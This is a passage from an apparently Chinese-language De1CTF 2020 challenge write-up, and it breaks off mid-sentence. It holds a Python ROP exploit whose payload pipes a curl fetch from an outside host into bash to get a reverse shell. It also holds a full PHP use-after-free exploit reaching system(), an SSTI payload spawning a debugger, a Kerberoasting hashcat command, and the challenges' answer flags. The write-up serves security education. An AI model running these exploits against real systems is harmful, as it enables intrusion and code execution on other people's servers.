class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"></span><br><span class="line">url = <span class="string">"http://134.175.185.244/select.php"</span></span><br><span class="line">url = <span class="string">"http://49.51.251.99/select.php"</span></span><br><span class="line">data = &#123;</span><br><span class="line">    <span class="string">"username"</span>:<span class="string">"admin"</span>,</span><br><span class="line">    <span class="string">"password"</span>:<span class="string">"goodlucktoyou"</span>,</span><br><span class="line">    <span class="string">"submit"</span>:<span class="string">"submit"</span></span><br><span class="line">&#125;</span><br><span class="line">cookie =&#123;</span><br><span class="line">    <span class="string">"PHPSESSID"</span>: <span class="string">"p51gfmno1tv687igcc1ndq14vh"</span></span><br><span class="line">&#125;</span><br><span class="line">res = requests.post(url,data=data,cookies=cookie)</span><br><span class="line">print(res.status_code)</span><br><span class="line">payload = <span class="string">"a"</span>*<span class="number">100</span></span><br><span class="line">data = &#123;</span><br><span class="line">    <span class="string">'search'</span>:<span class="string">"a"</span>*<span class="number">100</span>,</span><br><span class="line">    <span class="string">'submit'</span>:<span class="string">"submit"</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">res = requests.post(url,data=data,cookies=cookie)</span><br><span class="line">print(res.content)</span><br><span class="line">res = res.content.split(<span class="string">b'a'</span>*<span class="number">100</span>)[<span class="number">1</span>]</span><br><span class="line">stack = res[<span class="number">0</span>:<span class="number">6</span>]+<span class="string">b'\x00\x00'</span></span><br><span class="line">stack = struct.unpack(<span class="string">'&lt;Q'</span>, stack)[<span class="number">0</span>]</span><br><span class="line">print(<span class="string">"[+] stack:"</span>, hex(stack))</span><br><span class="line"></span><br><span class="line">data = &#123;</span><br><span class="line">    <span class="string">'search'</span>: <span class="string">"/proc/self/maps"</span>,</span><br><span class="line">    <span class="string">'submit'</span>:<span class="string">"submit"</span></span><br><span class="line">&#125;</span><br><span class="line">res = requests.post(url,data=data,cookies=cookie).content.split(<span class="string">b"\n"</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> res:</span><br><span class="line">    <span class="keyword">if</span> <span class="string">b"libc-2.28.so"</span> <span class="keyword">in</span> i:</span><br><span class="line">        libc_base = int(<span class="string">b"0x"</span> + i[<span class="number">0</span>:<span class="number">12</span>], <span class="number">16</span>)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">print(<span class="string">"[+] libc_base:"</span>, hex(libc_base))</span><br><span class="line"></span><br><span class="line">bss_str = libc_base + <span class="number">0x0000000001C0000</span></span><br><span class="line">pop_rdi_ret = libc_base + <span class="number">0x0000000000023a5f</span></span><br><span class="line">read = libc_base + <span class="number">0x00000000000EA450</span></span><br><span class="line">system = libc_base + <span class="number">0x00000000000449C0</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b"a"</span>*<span class="number">136</span></span><br><span class="line">payload += p64(pop_rdi_ret) + p64(stack+<span class="number">136</span>+<span class="number">24</span>) + p64(system) + <span class="string">b"curl https://shell.now.sh/xxx.xxx.xxx.xxx:xxxx|bash\x00"</span></span><br><span class="line"></span><br><span class="line">data = &#123;</span><br><span class="line">    <span class="string">'search'</span>:payload,</span><br><span class="line">    <span class="string">'submit'</span>:<span class="string">"submit"</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    res = requests.post(url,data=data,cookies=cookie)</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">    <span class="keyword">pass</span></span><br></pre></td></tr></table></figure><p>拿到shell之后，执行/readflag，算出表达式的值即可获得flag</p><blockquote><p>De1CTF{47ae3396-f5ce-47ab-bb64-34b5154064c4}</p></blockquote><h2><span id="easy-php-uaf">Easy PHP UAF</span></h2><h3><span id="解题思路">解题思路</span></h3><p>题目基于一个公开exp：https://github.com/mm0r1/exploits/blob/master/php7-backtrace-bypass/exploit.php ，它利用了debug_backtrace函数的bug来实现一个UAF漏洞。通过这个漏洞，我们可以读写PHP内存。</p><p>要解出这道题，需要一些PHP底层相关的知识和一点点Pwn相关的思想。</p><p>为了加大题目的难度，我加了一些料：</p><ol type="1"><li>在词法分析里面ban掉了循环结构</li><li>在扩展里面限制了函数执行深度</li><li>在php.ini里面ban掉了strlen，需要用别的方式泄露内存</li></ol><p>如果用gdb调试并弄懂原本的exp的原理，这道题目其实非常简单：</p><ol type="1"><li>UAF，可以直接用原exp里面的</li><li>泄露下一个PHP堆块的头指针，用于计算<span class="math inline">\(helper和\)</span>abc的存放地址</li><li>泄露Closure Object的存放地址</li><li>改写$helper-&gt;a，将它伪造成一个指向Closure Object的字符串</li><li>从Closure Object里面泄露出Closure Handlers的地址，然后计算system的地址</li><li>将需要用到的Closure Object数据复制到下一个PHP堆块上面，将它的internal_function.handler改写成system地址，然后改写$helper-&gt;b，让它指向这个假的Closure Object</li><li>执行$helper-&gt;b来执行system</li></ol><h3><span id="exp">exp</span></h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line">pwn(<span class="string">"/readflag"</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">pwn</span><span class="params">($cmd)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">global</span> $abc, $helper, $backtrace;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Vuln</span> </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> $a;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">            <span class="keyword">global</span> $backtrace;</span><br><span class="line">            <span class="keyword">unset</span>(<span class="keyword">$this</span> -&gt; a);</span><br><span class="line">            $backtrace = (<span class="keyword">new</span> <span class="keyword">Exception</span>) -&gt; getTrace(); <span class="comment"># ;)</span></span><br><span class="line">            <span class="keyword">if</span>(!<span class="keyword">isset</span>($backtrace[<span class="number">1</span>][<span class="string">'args'</span>])) &#123; <span class="comment"># PHP &gt;= 7.4</span></span><br><span class="line">                $backtrace = debug_backtrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Helper</span> </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> $a, $b, $c, $d;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">str2int</span><span class="params">($str)</span> </span>&#123;</span><br><span class="line">        $address = <span class="number">0</span>;</span><br><span class="line">        $address |= ord($str[<span class="number">4</span>]);</span><br><span class="line">        $address &lt;&lt;= <span class="number">8</span>;</span><br><span class="line">        $address |= ord($str[<span class="number">5</span>]);</span><br><span class="line">        $address &lt;&lt;= <span class="number">8</span>;</span><br><span class="line">        $address |= ord($str[<span class="number">6</span>]);</span><br><span class="line">        $address &lt;&lt;= <span class="number">8</span>;</span><br><span class="line">        $address |= ord($str[<span class="number">7</span>]);</span><br><span class="line">        <span class="keyword">return</span> $address;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">leak</span><span class="params">($offset)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> $abc;</span><br><span class="line">        <span class="keyword">return</span> strrev(substr($abc, $offset, <span class="number">8</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">leakA</span><span class="params">($offset)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> $helper;</span><br><span class="line">        <span class="keyword">return</span> strrev(substr($helper -&gt; a, $offset, <span class="number">8</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">write</span><span class="params">($offset, $data)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> $abc;</span><br><span class="line">        $abc[$offset] = $data[<span class="number">7</span>];</span><br><span class="line">        $abc[$offset + <span class="number">1</span>] = $data[<span class="number">6</span>];</span><br><span class="line">        $abc[$offset + <span class="number">2</span>] = $data[<span class="number">5</span>];</span><br><span class="line">        $abc[$offset + <span class="number">3</span>] = $data[<span class="number">4</span>];</span><br><span class="line">        $abc[$offset + <span class="number">4</span>] = $data[<span class="number">3</span>];</span><br><span class="line">        $abc[$offset + <span class="number">5</span>] = $data[<span class="number">2</span>];</span><br><span class="line">        $abc[$offset + <span class="number">6</span>] = $data[<span class="number">1</span>];</span><br><span class="line">        $abc[$offset + <span class="number">7</span>] = $data[<span class="number">0</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">trigger_uaf</span><span class="params">($arg)</span> </span>&#123;</span><br><span class="line">        $arg = str_repeat(<span class="string">'A'</span>, <span class="number">79</span>);</span><br><span class="line">        $vuln = <span class="keyword">new</span> Vuln();</span><br><span class="line">        $vuln -&gt; a = $arg;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment"># UAF</span></span><br><span class="line">    trigger_uaf(<span class="string">'x'</span>);</span><br><span class="line">    $abc = $backtrace[<span class="number">1</span>][<span class="string">'args'</span>][<span class="number">0</span>];</span><br><span class="line">    $helper = <span class="keyword">new</span> Helper;</span><br><span class="line">    $helper -&gt; b = <span class="function"><span class="keyword">function</span> <span class="params">($x)</span> </span>&#123; &#125;;</span><br><span class="line">    <span class="comment"># leak head point of next php heap</span></span><br><span class="line">    $php_heap = leak(<span class="number">0x88</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"PHP Heap: "</span> . bin2hex($php_heap) . <span class="string">"\n"</span>;</span><br><span class="line">    $abc_address = str2int($php_heap) - <span class="number">0x88</span> - <span class="number">0xa0</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'$abc: '</span> . dechex($abc_address) . <span class="string">"\n"</span>;</span><br><span class="line">    $closure_object = leak(<span class="number">0x20</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"Closure Object: "</span> . bin2hex($closure_object) . <span class="string">"\n"</span>;</span><br><span class="line">    <span class="comment"># let a point to closure_object</span></span><br><span class="line">    write(<span class="number">0x10</span>, substr($php_heap, <span class="number">0</span>, <span class="number">4</span>) . hex2bin(dechex(str2int($closure_object) - <span class="number">0x28</span>)));</span><br><span class="line">    write(<span class="number">0x18</span>, str_pad(<span class="string">"\x06"</span>, <span class="number">8</span>, <span class="string">"\x00"</span>, STR_PAD_LEFT));</span><br><span class="line">    <span class="comment"># leak Closure Handlers</span></span><br><span class="line">    $closure_handlers = leakA(<span class="number">0x28</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"Closure Handlers: "</span> . bin2hex($closure_handlers) . <span class="string">"\n"</span>;</span><br><span class="line">    <span class="comment"># compute system address</span></span><br><span class="line">    $system_address = dechex(str2int($closure_handlers) - <span class="number">10733946</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"System: "</span> . $system_address . <span class="string">"\n"</span>;</span><br><span class="line">    <span class="comment"># build fake closure_object</span></span><br><span class="line">    write(<span class="number">0x90</span>, leakA(<span class="number">0x10</span>));</span><br><span class="line">    write(<span class="number">0x90</span> + <span class="number">0x08</span>, leakA(<span class="number">0x18</span>));</span><br><span class="line">    write(<span class="number">0x90</span> + <span class="number">0x10</span>, leakA(<span class="number">0x20</span>));</span><br><span class="line">    write(<span class="number">0x90</span> + <span class="number">0x18</span>, leakA(<span class="number">0x28</span>));</span><br><span class="line">    $abc[<span class="number">0x90</span> + <span class="number">0x38</span>] = <span class="string">"\x01"</span>;</span><br><span class="line">    write(<span class="number">0x90</span> + <span class="number">0x68</span>, substr($php_heap, <span class="number">0</span>, <span class="number">4</span>) . hex2bin($system_address));</span><br><span class="line">    <span class="comment"># let b get this object</span></span><br><span class="line">    write(<span class="number">0x20</span>, substr($php_heap, <span class="number">0</span>, <span class="number">4</span>) . hex2bin(dechex(str2int($php_heap) + <span class="number">0x08</span> - <span class="number">0xa0</span>)));</span><br><span class="line">    <span class="comment"># eval system</span></span><br><span class="line">    ($helper -&gt; b)($cmd);</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2><span id="mc_logclient">mc_logclient</span></h2><p>文件列表： <a href="https://pastebin.com/qZxVNaqm" target="_blank" rel="noopener">exp.go</a> <a href="https://pastebin.com/rWAPYaRp" target="_blank" rel="noopener">types.go</a></p><p>这是一个 <code>minecraft log web client</code>。可以用于读取所有用户的日志。</p><p>默认python3.8环境，iptables禁止对外通讯，当然白名单了icmp，可以使用ping进行外带。（赛后发现出现非预期，由于多个题目环境处于同一网络，有队伍使用 mc 协议的对话功能带出数据）</p><p>玩家的日志都存储在 logs 文件夹里，以玩家 uuid 作为文件名。logs 文件夹以 只读方式 挂载到环境里。</p><p>一个简单的 ssti，黑名单过滤了大部分关键词。在 <code>python 3.7</code> 以后，有一个新的函数 <code>sys.breakpointhook()</code> 可以通过它起一个调试器，进行任意代码执行。</p><p>赛后发现，由于黑名单不完善出现非预期，可以通过 <code>\x</code> 或者 <code>request.args</code> 进行绕过，直接进行 ssti，不需要调用 <code>/write</code> 功能。</p><p>首先我们需要在游戏对话框里，进行先 payload 的操作。开头最好加上 <code>/</code> 将 payload 作为命令的形式进行隐藏，防止向其他选手泄露 payload。</p><p>payload 如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/&#123;&#123;[].__class__.__base__.__subclasses__()[133].__init__.__globals__[&apos;sys&apos;][&apos;breakpointhook&apos;]()&#125;&#125;</span><br></pre></td></tr></table></figure><p>然后访问 <code>/read?work={work}&amp;filename={uuid}</code> 触发 ssti。</p><p>大概有 30秒 的时间，去调用 <code>/write</code> 往 <code>pdb</code> 去写命令。</p><p>详情可见 <code>exp.go</code>。</p><p><code>De1CTF{MC_L0g_C1ieNt-t0-S1mPl3_S2Tl~}</code></p><h1><span id="misc">misc</span></h1><h2><span id="mc_easybgm">mc_easybgm</span></h2><p>文件列表： <a href="https://pastebin.com/8EeQ8YCz" target="_blank" rel="noopener">mp3.py</a></p><p>源自于上一年在某个比赛的启发，发现可以在mp3每一帧的保留位处隐写，当时写了实现脚本，现在发现弄丢了，然后重新写了一个。</p><p>详情可见 <code>mp3.py</code>。</p><p><a href="https://en.wikipedia.org/wiki/MP3#File_structure" target="_blank" rel="noopener">https://en.wikipedia.org/wiki/MP3#File_structure</a></p><p><code>De1CTF{W31c0m3_t0_Mi73CR4Ft_W0r1D_D3jAVu!}</code></p><h2><span id="misc-mc_joinin">misc - mc_joinin</span></h2><p>文件列表： <a href="https://pastebin.com/Ez5khLu5" target="_blank" rel="noopener">exp.go</a> <a href="https://pastebin.com/rWAPYaRp" target="_blank" rel="noopener">types.go</a></p><p>因为想要出一道mc题，然后红石题以前比赛已经出现过，所以就没有出了。</p><p>最近在搞网络协议开发这块，所以熟悉了一下mc协议，发现可以在此处作文章。回想起中科大校赛黑曜石浏览器那题改ua版本号，发现协议通讯也涉及版本验证，所以出了这么一道题。</p><p>去重新写协议很麻烦，偷懒在某hub找到一个轮子<a href="https://github.com/TyphoonMC/TyphoonLimbo" target="_blank" rel="noopener">TyphoonMC/TyphoonLimbo</a>，直接魔改。</p><p>游戏开放在 <code>25565</code> 端口。</p><p>添加服务器到列表里，发现是 <code>MC2020</code> 服务端。</p><p><img src="https://i.loli.net/2020/05/05/riEdb1Cu59RZcJT.png"></p><p>从官网得知 <code>MC2020</code> 是基于 <code>1.12</code> 开发的。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Minecraft 20.20 is developed by De1ta Team based on 1.12</span><br></pre></td></tr></table></figure><p>所以我们可以用 <code>1.12</code> 的协议去通讯。</p><p>这里有两种实现方法。第一种是 MITM 中间人篡改通讯数据包里的版本号，绕过验证，成功登录游戏。第二种是直接模拟通讯协议，实现通讯。</p><p>参考资料：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Minecraft 1.12 Protocol(Version: 335) Wiki Page</span><br><span class="line">https://wiki.vg/index.php?title=Protocol&amp;oldid=13223</span><br></pre></td></tr></table></figure><p><code>exp.go</code> 包含两种解法。</p><p>flag藏在 <code>imgur</code> 的图片里。</p><p><img src="https://i.loli.net/2020/05/05/S72oQOWhYrAcBa6.png"></p><p><code>De1CTF{MC2020_Pr0to3l_Is_Funny-ISn't_It?}</code></p><h2><span id="mc_champion">mc_champion</span></h2><p>文件列表： <a href="https://pastebin.com/964gxEzg" target="_blank" rel="noopener">exp.go</a> <a href="https://pastebin.com/rWAPYaRp" target="_blank" rel="noopener">types.go</a></p><p>此题基于轮子 <a href="https://github.com/TyphoonMC/TyphoonLimbo" target="_blank" rel="noopener">TyphoonMC/TyphoonLimbo</a> 魔改而来。</p><p>由于这个轮子的原因，所以数据包与市面上的MC客户端不是特别兼容，会经常掉线，尤其是网络不好的情况。所以这题建议模拟 <code>1.12</code> 通讯协议，实现通讯。</p><p>当你进入游戏，此时处于虚空时间，除了对话，其他功能都无法使用。熟悉命令行的选手，不难发现 <code>/help</code> 命令，这是一个文字游戏。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">[ADMIN]</span><br><span class="line">/help -&gt; show the usage</span><br><span class="line">/uuid -&gt; show your uuid</span><br><span class="line">/status -&gt; show your status</span><br><span class="line">/items -&gt; show your items</span><br><span class="line">/exchange -&gt; make some exchange</span><br><span class="line">/shop -&gt; list all category</span><br><span class="line">/shop [category_id] -&gt; list items in category</span><br><span class="line">/buy [item_id] -&gt; buy the item</span><br><span class="line">/use [item_id] -&gt; use your item</span><br><span class="line">/attack -&gt; attack the BOSS</span><br></pre></td></tr></table></figure><p>玩家的物品都存储在一个 <code>slice</code> 列表里，而且每一个物品都包含以下属性，fuzz一下也不难发现这点。</p><blockquote><p>Price / Attack / Shield / HP / Food / XP</p></blockquote><p>漏洞函数位于 <code>exhcange</code> -&gt; <code>random sell</code>。 这个漏洞是我平时写代码时发现的，他会触发大概像 <code>slice</code> 出栈的功能，但是由于返回值顺序的问题，导致返回了错误的值。大致代码如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">func slicePop(s []int, i uint) (r []int, e int) &#123;</span><br><span class="line">    if len(s) == 0 &#123;</span><br><span class="line">        return []int&#123;&#125;, -1</span><br><span class="line">    &#125;else if len(s) == 1 &#123;</span><br><span class="line">        return []int&#123;&#125;, s[0]</span><br><span class="line">    &#125;</span><br><span class="line">    if i &gt;= uint(len(s)) &#123;</span><br><span class="line">        return s[1:], s[0]</span><br><span class="line">    &#125;</span><br><span class="line">    return append(s[:i], s[i + 1:]...), s[i]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我这里的解法是，通过不断调用此功能，获得足够多的金钱（大于200），然后使用一个TNT去打败boss。</p><p>当然，赛后发现还有其他解法，只需要最终打败boss即可。</p><p>详情可见 <code>exp.go</code>。</p><p>当你打败boss，你将得到编码信息。简单地进行 <code>base32解码</code> 和 <code>rot13变换</code> ，你将得到 flag 和一个隐藏命令 <code>/MC2020-DEBUG-VIEW:-)</code>。</p><p><code>De1CTF{S3cur3_UsAG3_0f-GO_Slice~}</code></p><h2><span id="life">Life</span></h2><p>No Game No Life!</p><figure><img src="https://i.loli.net/2020/05/06/BWRS5XzCgJfqh9o.jpg" alt><figcaption>87821588769450_.pic_hd.jpg</figcaption></figure><h3><span id="hints">Hints</span></h3><ol type="1"><li>Game of Life.</li></ol><h3><span id="flag">Flag</span></h3><p>De1CTF{l3t_us_s7art_th3_g4m3!}</p><h3><span id="solution">Solution</span></h3><ol type="1"><li>从jpg中分离出题目本体的zip;</li><li>zip内含一张黑白图片，以及另一个加密的zip;</li><li>将黑白图片作为康威生命游戏的输入跑一回合，得到qrcode，扫码得到zip的密码;</li><li>解压zip，内含一个文本文件;</li><li>将pilf.txt中的文本反转，debase64，再反转，HEX to ASCII，得到flag.</li></ol><h3><span id="note">Note</span></h3><p>这玩意主要是数据很难造，我花了好几天也没整出来怎么逆康威生命游戏状态，搜了一下好像是要ML。</p><p><del>不如直接把逆康威生命游戏出成一道炼丹题</del></p><p>现在用的密码是之前某次decoding时见到的，我把它反色过了所以直接搜是搜不出来的。</p><p>如果剩下几天能整出来的话就换个图。</p><h2><span id="easy-protocol">Easy Protocol</span></h2><h3><span id="hint">hint</span></h3><p>hint的文件头是<code>MSCF</code>，搜索一下可以知道这就是一个makecab压缩的文件，直接使用expand命令解压得到hint.txt</p><p>hint.txt</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">hint1: flag is De1CTF&#123;part1_part2_part3&#125;</span><br><span class="line">hint2: The part1,part2 and part3 is a pure number with a length of 8</span><br><span class="line"></span><br><span class="line">have fun!!!!!</span><br></pre></td></tr></table></figure><p>hint.txt应该是和流量包有关的，暂时先不管</p><h3><span id="part1">part1</span></h3><p>简单浏览一下数据包，主要把目光投到Kerberos协议和LDAP协议上，简单跟一下LDAP，发现过滤条件是：<code>(&amp;(&amp;(&amp;(samAccountType=805306368)(servicePrincipalName=*))(samAccountName=De1CTF2020))(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))</code>，主要是这个<code>servicePrincipalName=*</code>，是查询域用户<code>De1CTF2020</code>所有存在的SPN</p><figure><img src="https://i.loli.net/2020/05/05/98zZt3wkNfog7Hi.png" alt><figcaption>9.png</figcaption></figure><p>然后后面又有一个TGS-REQ请求</p><figure><img src="https://i.loli.net/2020/05/05/raVzWJtOveiPslk.png" alt><figcaption>10.png</figcaption></figure><p>再回到hint中，应该是要你暴力破解之类的，然后猜测应该是<code>Kerberoasting</code></p><p>然后将TGS-REQ中的SPN和票据的<code>enc-part</code>提取出来</p><figure><img src="https://i.loli.net/2020/05/05/boYP7hWDpjUnzQV.png" alt><figcaption>8.png</figcaption></figure><p>构造成hashcat支持的hash格式，<code>$krb5tgs$23$*&lt;USERNAME&gt;$&lt;DOMAIN&gt;$&lt;SPN&gt;*$&lt;FIRST_16_BYTES&gt;$&lt;REMAINING_BYTES&gt;</code></p><p>然后爆破即可</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hashcat64.exe -m 13100 $krb5tgs$23$*De1CTF2020$test.local$part1/De1CTF2020*$b9bac2cd9555738bc4f8a38b7aa3b01d$12befde687b62d10d325ebc03e0dd0d6bca1f526240dfa6d23dc5bcafc224591dcf4ba97bf6219cfbe16f1b59d289800fdcc8f051626b7fe0c2343d860087c45b68d329fd1107cebe4e537f77f9eea0834ae8018a4fe8518f1c69be95667fd69dcc590d3d443a8530ff8e38ee7f7b6e378d64a8b43b985bcc20f941947ea9e8463fd7e0fa77f284368b9b489f6d557da1e02990cfc725723e5d452ff6e659717947805b852ad734c5acc8011e535b96cef3af796610196d31c725362f7426e0cf92985ffe0717baaf5066fdba760b90e2c9b7e15bc9a4952cff47d4a092d3be6128997f9ff85dbafb85a5569b5d021b2a23c6371cbdf8beaa68b332e6ba1c1a8dc43c50695498ed8c2dfbf11760af35e1b913cd36b8015df37a146d2696c8b6b5f2ce375f2674acc0ce04aa98b9d21291466ce7a2aeb5a72fda17fa53e5b41df67d3898457d05fc899096092b3aa5bc333cb75eb5eee4b1c33356e72d9d28d6d674a5e47f64c72afb580e8d4f713a5ae265a4c825c39c19313a532a23c27eaf24bcde29c5e65c13cc057e0db72094bcedb6049574e35e511847f460180ddd78f4c9187345b1068bd608ca238c20d200ffa7e3891d076fe6fcef93d044c79f5ec9fb33561a35acf785b2a203df6d07e39161d9d3cedbe6d4394bd2bf43e545acd03f796c7863d684f9db4a5eef070f71e58a4882c2387d0705f4bed32fd7986dd672a15f6cfa56fe127af7c157216b2ea4f61ab7963d9dcaf4bb9222a7cba86d6a5e6c24833ffbf1957d90224764a01e0cb5a90f12dfea4ddaef23e30c2bdafcbcd99031db5d0698c1a050fc679213a8b81b854c08686f43241a4ec937c71cd09c9519fa2bba3aa845c4e84dbd6d9bbc3a62c876fb4c30bfa7960f0f51587ece14a31add698b1b9743e14fc343394f8a346c8e24cc8c26a8f8246f6a68928d0118dea81fea9976af3c57fa4c764f565e458e065d5a2a3dd1b083f7851d4ae1b791ada853e9a20e5b169ea0b8b582711f04df4dad8b461771dda5fca11c3f8f82d85e657bbd57d12cf15c8bbce7ad6cd1ebf540c45aefd4aef2ec828b06f208bd57be6a5529481b9f8b8fad5962e86b349a720ec2a1380ed711ee0261b29383907dae6f7a45d3fff54efae7ace1f4d7193f4a4d932699a41c3deb3ba9934278942e8f09ecd4339de4059dd3ff06b78e773b6ab9826df7ea2a443dddd55cdf79db1f76e2f05105e6cc5f0c4bd494b9556d921c6cb3fa48d1ddd27cf077ebd3e44b716fc74d1115b293e348fb9676e6727a3a97a7c2b86e8b83d8f90b9bf628c71e56aabcac381a32d493db3f255378c498a0bf527a9677cb81ec89911a9b09d6ffe16e2f2de63728439f8275d9f6feac2da860c5aab772034b2b0b962c033f8102ac86b2a9b07a82e9c70be65fe371e9d296afbe0e7272b90256428553c6a4fb0a8f5290098e4dad4021d99a65f2a3fa4ad0d2f ?d?d?d?d?d?d?d?d -a 3 --force</span><br></pre></td></tr></table></figure><p>得到part1:79345612</p><h3><span id="part2">part2</span></h3><p>这其实是<code>AS-REPRoasting</code>，判定过程如下：</p><p>跟进LDAP查询的请求，发现有一个这样的过滤条件<code>(userAccountControl:1.2.840.113556.1.4.803:=4194304)</code></p><figure><img src="https://i.loli.net/2020/05/05/dpPUTgXieY9AGIw.png" alt><figcaption>4.png</figcaption></figure><figure><img src="https://i.loli.net/2020/05/05/IZRjrLFk8Eldpac.png" alt><figcaption>5.png</figcaption></figure><p><code>DONT_REQ_PREAUTH</code>的值为<code>4194304</code>，也就是说这个LDAP请求是查找开启了<code>Do not require Kerberos preauthentication</code>的用户，如果用户开启了<code>Do not require Kerberos 